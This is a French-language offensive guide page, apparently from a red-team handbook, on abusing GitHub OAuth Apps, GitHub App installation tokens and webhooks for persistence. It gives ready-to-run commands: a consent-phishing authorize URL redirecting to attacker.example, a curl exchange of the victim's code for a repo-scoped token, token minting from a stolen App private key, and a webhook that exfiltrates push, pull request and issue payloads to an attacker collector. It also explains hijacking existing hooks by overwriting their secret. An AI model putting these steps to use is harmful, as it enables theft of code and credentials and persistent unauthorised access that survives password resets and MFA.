---
title: "Abus des OAuth Apps et des webhooks : accès durable via les applications autorisées et exfiltration d'événements"
order: 4
description: "Persistance via les OAuth Apps autorisées, les GitHub Apps installées et leurs jetons d'accès d'installation, le phishing de consentement d'une OAuth App avec la portée repo, et les webhooks de dépôt ou d'organisation qui exfiltrent les charges utiles de push et d'événements vers un endpoint attaquant."
keywords:
  - OAuth App
  - GitHub App
  - jeton d'accès d'installation
  - webhook
  - phishing de consentement
---

# Abus des OAuth Apps et des webhooks

Les mots de passe changent et les PAT sont révoqués, mais **les applications autorisées et les webhooks leur survivent aux deux**. Une OAuth App ou une GitHub App que la victime a autorisée conserve son octroi jusqu'à révocation explicite, survivant aux réinitialisations de mot de passe et même à l'inscription à la MFA. Un webhook ajouté à un dépôt ou une organisation expédie discrètement chaque événement correspondant vers une URL que vous contrôlez. Les deux ont une apparence administrative, ce qui explique leur durabilité.

## Faire l'empreinte de la surface des apps et des hooks

Avec une session ou un jeton portant la bonne portée, listez ce qui est déjà autorisé et quels hooks existent :

```bash
# Apps the current user has authorized (OAuth) and installed (GitHub Apps)
gh api /user/installations -q '.installations[] | [.app_slug, .id] | @tsv'

# Existing webhooks on a repo / org (needs admin on the resource)
gh api /repos/ACME/service/hooks -q '.[] | [.id, .config.url, (.events|join(","))] | @tsv'
gh api /orgs/ACME/hooks -q '.[] | [.id, .config.url] | @tsv'
```

Un webhook au niveau de l'organisation est le hook de plus grande valeur : il voit les événements de tous les dépôts à la fois.

## Phishing de consentement d'une OAuth App

Une OAuth App que vous enregistrez demande à la victime d'autoriser des portées ; l'écran de consentement de GitHub affiche le nom de l'application et les portées, mais la victime clique sans y prêter attention. Demandez `repo` (et `read:org`) et le jeton utilisateur résultant lit et écrit tous leurs dépôts :

```
https://github.com/login/oauth/authorize?client_id=<your_client_id>&scope=repo%20read:org&redirect_uri=https://attacker.example/cb
```

Le navigateur de la victime renvoie un `code` à votre `redirect_uri` ; échangez-le contre un jeton d'accès utilisateur à longue durée de vie :

```bash
curl -s -X POST https://github.com/login/oauth/access_token \
  -H 'Accept: application/json' \
  -d 'client_id=<id>&client_secret=<secret>&code=<code>&redirect_uri=https://attacker.example/cb'
# { "access_token": "gho_...", "scope": "repo,read:org", "token_type": "bearer" }
```

Ce jeton `gho_` se comporte comme l'utilisateur pour les besoins de l'API et persiste jusqu'à ce que l'autorisation soit révoquée, indépendamment du mot de passe ou de la MFA de la victime.

## Jetons d'accès d'installation depuis une GitHub App

Une GitHub App s'authentifie en tant qu'elle-même avec un JWT signé par sa clé privée, puis génère un **jeton d'accès d'installation** de courte durée limité aux dépôts où elle est installée. Si vous obtenez la clé privée et l'App ID d'une App (depuis un secret divulgué, une variable de CI ou un propriétaire d'App compromis), vous générez des jetons limités aux dépôts à volonté :

```bash
# 1. Build an App JWT (RS256, signed with the App private key), valid ~10 min
JWT=$(python3 - <<'PY'
import jwt, time
key = open('app.pem').read()
print(jwt.encode({"iat": int(time.time())-60, "exp": int(time.time())+540, "iss": "123456"}, key, algorithm="RS256"))
PY
)
# 2. Find installations, then mint an installation token
curl -s -H "Authorization: Bearer $JWT" -H 'Accept: application/vnd.github+json' \
  https://api.github.com/app/installations -q
curl -s -X POST -H "Authorization: Bearer $JWT" \
  https://api.github.com/app/installations/<installation_id>/access_tokens
# { "token": "ghs_...", "expires_at": "...", "permissions": { "contents": "write", ... } }
```

Le jeton `ghs_` porte les permissions que l'installation de l'App a reçues (souvent `contents: write`, `actions: write`), limitées à ses dépôts, et se renouvelle depuis la clé indéfiniment, ce qui est la primitive de persistance.

## Exfiltration par webhook

Un webhook délivre une charge utile JSON pour chaque événement souscrit à son `config.url`. Ajoutez-en un pointant vers votre collecteur et vous recevez le contenu des pushs, les corps de PR et de tickets, et les événements de membres au fur et à mesure. Ajouter un hook nécessite l'admin sur le dépôt ou l'organisation :

```bash
curl -s -X POST -H "Authorization: token $TOKEN" \
  https://api.github.com/repos/ACME/service/hooks \
  -d '{
    "name": "web",
    "active": true,
    "events": ["push","pull_request","issues"],
    "config": { "url": "https://attacker.example/h", "content_type": "json", "secret": "s3cr3t" }
  }'
```

Les charges utiles de push incluent les diffs de commit et les e-mails des auteurs ; les charges utiles de PR et de tickets incluent les corps qui contiennent fréquemment des détails internes. Le `secret` que vous définissez est la clé HMAC avec laquelle GitHub signe les livraisons, de sorte que vous pouvez vérifier (et que votre collecteur fait confiance au) flux. Lire le `config.secret` d'un hook **existant** n'est pas renvoyé par l'API, mais vous pouvez l'écraser avec un `PATCH` pour prendre le contrôle d'un hook déjà approuvé par une automatisation en aval.

## Suite

- Jeton OAuth/App avec `contents: write` : pousser des portes dérobées et des releases empoisonnées, voir [abus des jetons et de GITHUB_TOKEN](token-and-github-token-abuse.md).
- Jeton d'installation renouvelé depuis une clé d'App volée : accès durable, indépendant de la MFA, qui survit au renouvellement des identifiants.
- Flux de webhook d'organisation : renseignement continu sur chaque dépôt (nouveaux secrets dans les pushs, changements de personnel) alimentant une [reconnaissance](reconnaissance.md) plus poussée.

## Notes d'exploitation

- Les OAuth Apps autorisées et les GitHub Apps installées survivent à la réinitialisation du mot de passe et à l'inscription à la MFA ; c'est la persistance discrète que la plupart des réponses à incident manquent.
- Une clé privée de GitHub App vaut plus qu'un PAT : elle génère de nouveaux jetons d'installation à l'infini, suffisamment limités et de courte durée pour paraître routiniers.
- Vous ne pouvez pas lire le secret d'un webhook existant, mais vous pouvez le modifier par `PATCH` ; écraser le secret et l'URL d'un hook de confiance détourne un canal de livraison existant.
- Les hooks au niveau de l'organisation battent les hooks de dépôt : un seul hook, les événements de tous les dépôts.

## Outils

- **gh api** : lister, créer et modifier directement les hooks et les installations.
- **PyJWT** / **ghtoken** : construire le JWT de l'App et générer des jetons d'accès d'installation depuis une clé privée.
- **smee.io** / tout request bin : mettre en place un collecteur de webhooks pour recevoir les charges utiles exfiltrées.

## Références

- [GitHub : authenticating as a GitHub App installation](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation)
- [GitHub REST API : repository webhooks](https://docs.github.com/en/rest/repos/webhooks)
- [GitHub : authorizing OAuth apps (web flow)](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps)
- [Praetorian : GitHub App and OAuth token abuse for persistence](https://www.praetorian.com/blog/)
- [PayloadsAllTheThings : CI/CD and GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CI%20CD/README.md)
